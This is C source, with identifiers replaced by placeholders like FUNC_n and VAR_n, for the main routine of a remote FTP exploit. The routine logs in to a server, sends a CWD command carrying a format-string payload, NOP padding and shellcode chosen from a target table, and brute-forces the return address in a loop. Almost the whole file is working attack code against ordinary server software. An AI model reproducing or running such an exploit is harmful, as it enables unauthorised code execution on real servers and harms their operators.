
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_short ;
typedef int u_long ;
typedef int u_int ;
struct TYPE_2__ {int written; int align; int retaddr; char* name; char* code; void* retloc; void* stackpops; } ;
typedef int FILE ;


 int VAR_0 ;
 char* VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (char*,int,int *) ;
 void* FUNC_1 (int ) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,int) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int *) ;
 int * FUNC_7 (int,char*) ;
 int FUNC_8 (int *,char*,...) ;
 int FUNC_9 (int,char**,char*) ;
 int FUNC_10 (char*,int ,int) ;
 char* FUNC_11 (int,void*,void*,int,int) ;
 int VAR_4 ;
 int FUNC_12 (char*) ;
 int FUNC_13 (int) ;
 int FUNC_14 (int) ;
 int * VAR_5 ;
 char* FUNC_15 (int ) ;
 int FUNC_16 (char*) ;
 int * FUNC_17 (char*,char*) ;
 void* FUNC_18 (int ,int *,int) ;
 TYPE_1__* VAR_6 ;
 int FUNC_19 (char*) ;
 scalar_t__ FUNC_20 (int) ;

int FUNC_21(int VAR_7, char *VAR_8[])
{
 u_long VAR_9, VAR_10 = 0x0 ;
 u_short VAR_11 = 21 ;

 char * VAR_12 = "ftp";
 char * VAR_13 = "ftp@";
 char * VAR_14 = "127.0.0.1";

 int VAR_15, VAR_16, VAR_17, VAR_18 = 0 ;

 char VAR_19[ VAR_0 ],
  VAR_20[ VAR_0 ];

 char * VAR_21 = (char *)FUNC_20( 10000 );
 FILE * VAR_22 = ((void*)0) ;

 FUNC_8( VAR_5, VAR_1 );
 if ( VAR_7 < 2 ) { FUNC_19( VAR_8[0] ); FUNC_5(-1); }

        while ((VAR_15 = FUNC_9(VAR_7, VAR_8, "b:u:p:w:g:P:n:a:r:hv:t:")) != VAR_2) {
                switch(VAR_15)
                {
   case 'b': VAR_10 = FUNC_18(VAR_4,((void*)0),16); break;
   case 't': VAR_18 = FUNC_1(VAR_4); break;
   case 'v': VAR_14 = FUNC_15( VAR_4 ); break;
   case 'u': VAR_12 = FUNC_15( VAR_4 ); break;
   case 'p': VAR_13 = FUNC_15( VAR_4 ); break;
                        case 'w': VAR_6[VAR_18].written = FUNC_1(VAR_4); break;
                        case 'g': VAR_6[VAR_18].retloc = FUNC_18(VAR_4,((void*)0),16); break;
                        case 'P': VAR_11 = FUNC_1(VAR_4); break;
                        case 'n': VAR_6[VAR_18].stackpops = FUNC_1(VAR_4); break;
                        case 'a': VAR_6[VAR_18].align = FUNC_1(VAR_4); break ;
                        case 'r': VAR_6[VAR_18].retaddr = FUNC_18(VAR_4,((void*)0),16); break;
                        case 'h':
                        default : FUNC_19( VAR_8[0] ); FUNC_5( -1 ); break ;
                }
        }

 FUNC_8( VAR_5, "[+] Using target %s\n", VAR_6[ VAR_18 ].name );

 if ( (VAR_9 = FUNC_12( VAR_14 )) == -1 )
  FUNC_4( "Bad hostname or ip." );

 do {
  if ( (VAR_17 = FUNC_3( VAR_9, VAR_11 )) > 0 ) {
   VAR_22 = FUNC_7 ( VAR_17, "a+" );
   if ( &FUNC_7 == ((void*)0) ) FUNC_4( "fdopen failed." );
  }
  else FUNC_4( "Cannot connect to host." );

  FUNC_8( VAR_5, "[+] Trying to log in...\n");

         FUNC_0( VAR_19, VAR_0, VAR_22 );
  FUNC_8( VAR_22, "USER %s\r\n", VAR_12);
         FUNC_0( VAR_19, VAR_0, VAR_22 );
  FUNC_8( VAR_22, "PASS %s\r\n", VAR_13);
         FUNC_0( VAR_19, VAR_0, VAR_22 );

  if ( FUNC_17( VAR_19, "logged in" ) == ((void*)0) )
   FUNC_4( "Cannot log in, wrong user/pwd ?" );
  else
   FUNC_8( VAR_5, "[+] Doing the actual exploit...\n");

  FUNC_8( VAR_22, "CWD /\r\n" );
  FUNC_0( VAR_19, VAR_0, VAR_22 );

  FUNC_8( VAR_22, "CWD " );

  VAR_21 = FUNC_11( VAR_6[ VAR_18 ].align,
                                VAR_6[ VAR_18 ].stackpops,
           VAR_6[ VAR_18 ].retloc,
                                VAR_10 ? VAR_10 : VAR_6[ VAR_18 ].retaddr,
                                VAR_6[ VAR_18 ].written
  );



  VAR_16 = 256 - FUNC_16( "CWD " ) - FUNC_16( VAR_6[VAR_18].code ) - FUNC_16( VAR_21 ) - 4;
  FUNC_10( VAR_20, VAR_3, VAR_16 );
  VAR_20[ VAR_16 ] = 0 ;




  FUNC_8( VAR_5, "[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\n",
  VAR_6[VAR_18].written, VAR_6[VAR_18].align, VAR_10 ? (u_int)VAR_10 : (u_int)VAR_6[VAR_18].retaddr, (u_int)VAR_6[VAR_18].retloc, VAR_16 );

  FUNC_8( VAR_22, "%s", VAR_21 );
  FUNC_8( VAR_22, "%s", VAR_20 );
  FUNC_8( VAR_22, "%s", VAR_6[VAR_18].code );
  FUNC_8( VAR_22, "\r\n" );
  FUNC_8( VAR_22, "QUIT\r\n" );
  if ( VAR_10 ) VAR_10 -= VAR_16 ;
  FUNC_6( VAR_22 );
  FUNC_2( VAR_17 );
  FUNC_14( 1 );
 }
 while (( FUNC_13( VAR_9 ) == -1 ) && ( VAR_10 > 0xbffff000 ));

 FUNC_8( VAR_5, "[-] Bye\n");
 return( 0xc1a0 );
}
